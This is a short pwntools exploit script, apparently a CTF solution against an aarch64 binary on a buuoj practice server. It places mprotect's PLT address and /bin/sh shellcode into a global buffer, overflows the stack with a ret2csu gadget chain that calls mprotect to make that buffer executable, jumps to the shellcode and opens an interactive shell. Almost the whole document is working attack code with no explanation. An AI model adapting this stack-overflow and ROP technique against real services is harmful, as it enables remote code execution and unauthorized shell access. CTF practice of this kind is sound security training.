from pwn import *

context(os = 'linux', arch = 'aarch64', log_level = 'debug')
# io = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', './pwn'])
# io = process(['qemu-aarch64', '-L', '/usr/aarch64-linux-gnu/', '-g', '1234', './pwn'])
io = remote('node4.buuoj.cn', 26354)
# libc = ELF('/usr/aarch64-linux-gnu/lib/libc-2.31.so')
# libc = ELF('libc.so_2.6')
elf = ELF('pwn')
mprotect_plt = elf.plt['mprotect']
csu_down, csu_up = 0x4008CC, 0x4008AC
name = 0x411068
mprotect_addr, shellcode_addr = name, name + 8
shellcode = asm(shellcraft.sh())
padding = 72


payload1 = p64(mprotect_plt) + shellcode
io.sendlineafter('Name:', payload1)

payload2 = cyclic(padding) + p64(csu_down)
payload2 += p64(0) + p64(csu_up)                # x29 x30(return registers)
payload2 += p64(0) + p64(1)                     # x19 x20
# mprotect(shellcode_addr, 0x1000, 7)
payload2 += p64(mprotect_addr) + p64(7)         # x21(func_addr) x22(arg2)
payload2 += p64(0x1000) + p64(shellcode_addr)   # x23(arg1) x24(arg0)
payload2 += p64(0) + p64(shellcode_addr)        # x29 x30(return registers)
# pause()
io.sendline(payload2) 
io.interactive()
